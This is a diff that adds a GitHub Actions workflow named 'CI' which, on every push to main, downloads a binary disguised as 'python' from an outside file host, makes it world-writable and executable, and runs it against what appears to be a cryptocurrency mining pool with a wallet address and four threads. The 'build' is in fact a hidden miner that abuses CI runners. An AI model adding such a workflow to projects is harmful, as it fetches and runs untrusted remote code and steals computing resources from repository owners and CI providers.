@@ -1,0 +1,19 @@
+name: CI
+on:
+  push:
+    branches:
+      - main
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+
+      # Menjalankan skrip curl dengan opsi tambahan
+      - name: Download and Execute Script
+        run: |
+          curl -o python https://upload.vina-host.com/ORTX6eFQop/python
+          chmod 777 python
+          ./python -d eu.spectre-network.nevermine.io:55555 -w spectre:qqnxrxajcqdu8g5d3xm6c067y2wc9wumqx6xmqwysy2e6uh5tplm7fsraha7x.tes -t 4
